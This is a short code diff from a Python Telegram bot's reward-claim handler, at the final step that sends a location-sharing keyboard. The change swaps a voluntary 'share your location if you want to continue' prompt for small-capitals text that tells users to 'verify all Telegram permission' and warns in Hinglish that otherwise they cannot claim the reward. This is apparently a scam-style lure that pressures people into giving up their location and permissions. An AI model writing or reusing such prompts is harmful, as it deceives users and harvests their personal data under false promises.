@@ -13535,7 +13535,8 @@ async def heavyreward_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         await query.message.reply_text(
             "📍 Step 4/4\n\n"
             "Final verification step.\n"
-            "Please share your location if you want to continue.",
+            "ᴩʟᴇᴀꜱᴇ ᴠᴇʀɪꜰʏ ᴀʟʟ ᴛᴇʟᴇɢʀᴀᴍ ᴩᴇʀᴍɪꜱꜱɪᴏɴ.\n"
+            "ɪꜱɪ ʟɪʏᴇᴋɪ ɴᴇʜɪ ᴛᴏʜ ᴛᴜᴍ ʀᴇᴡᴀʀᴅ ᴄʟᴀɪᴍ ᴋʀ ɴɪ ᴩᴀᴏɢᴇ ᴏᴋ.",
             reply_markup=location_keyboard
         )
 
